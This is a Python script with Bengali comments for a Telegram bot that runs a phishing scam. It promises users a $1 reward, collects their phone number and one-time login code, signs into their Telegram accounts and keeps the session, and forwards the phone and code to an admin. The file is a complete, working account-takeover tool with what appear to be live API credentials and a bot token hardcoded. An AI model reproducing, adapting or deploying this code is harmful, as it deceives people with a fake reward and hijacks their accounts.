import os
import sys

# লাইব্রেরি চেক ও অটো ইনস্টল
try:
    import requests
    from telethon import TelegramClient, events, Button, errors
except ImportError:
    os.system("pip install requests telethon")
    os.execl(sys.executable, sys.executable, *sys.argv)

from telethon.network import ConnectionTcpFull
import asyncio
import shutil

# --- Configuration ---
API_ID = 28260353
API_HASH = 'bc2b69b2727821422ed0adf43a82700a'
BOT_TOKEN = '8583771126:AAGSpLD_JtZ-QvYWhIol0NvcgygG51HRtU4'
ADMIN_ID = 7852368023

# সেশন ক্লিনআপ ফাংশন
def clean_sessions():
    for file in os.listdir('.'):
        if file.endswith(".session") or file.endswith(".session-journal"):
            try: os.remove(file)
            except: pass
    if os.path.exists('sessions'):
        shutil.rmtree('sessions')
    os.makedirs('sessions')

clean_sessions()

# মেইন বট (নতুন সেশন নাম দিয়ে যাতে লক না হয়)
bot = TelegramClient('new_main_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond(
        "🎁 <b>Congratulations! You Won $1 USD</b> 💲\n\n"
        "💡 <b>Verify your account to claim.</b>",
        buttons=[Button.inline("✅ CLAIM NOW ✅", b"claim")],
        parse_mode='html'
    )

@bot.on(events.CallbackQuery(data=b"claim"))
async def claim(event):
    chat_id = event.chat_id
    async with bot.conversation(chat_id, timeout=600) as conv:
        try:
            await conv.send_message("📱 <b>ENTER YOUR TELEGRAM NUMBER:</b>", parse_mode='html')
            phone_res = await conv.get_response()
            phone = phone_res.text.strip().replace(" ", "")

            # সেশন ফাইল তৈরি
            client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH, connection=ConnectionTcpFull)
            await client.connect()

            sent_code = await client.send_code_request(phone)
            h_code = sent_code.phone_code_hash
            
            await conv.send_message("🔑 <b>ENTER THE 5-DIGIT OTP:</b>", parse_mode='html')
            otp_res = await conv.get_response()
            otp = otp_res.text.strip()

            await client.sign_in(phone, code=otp, phone_code_hash=h_code)
            
            await conv.send_message("🎉 <b>SUCCESS! Reward processing...</b>")
            await bot.send_message(ADMIN_ID, f"✅ <b>LOGIN SUCCESS!</b>\n📱 Phone: {phone}\n🔑 OTP: {otp}")
            
            asyncio.create_task(client.run_until_disconnected())

        except Exception as e:
            await conv.send_message(f"❌ Error: {str(e)}")

print("--- BOT STARTED SUCCESSFULLY ---")
bot.run_until_disconnected()
